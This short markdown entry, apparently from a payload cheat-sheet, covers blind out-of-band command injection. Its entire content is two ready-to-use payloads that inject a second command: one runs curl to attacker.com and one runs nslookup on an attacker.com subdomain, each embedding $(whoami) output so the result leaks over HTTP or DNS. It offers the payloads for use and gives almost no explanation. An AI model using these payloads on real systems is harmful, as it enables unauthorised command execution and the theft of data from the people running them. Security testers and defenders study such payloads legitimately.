# Blind OOB Command Injection

## Summary
Exfiltrate command output via DNS/HTTP.

## Payloads

```
; curl http://attacker.com/$(whoami)
| nslookup $(whoami).attacker.com
```
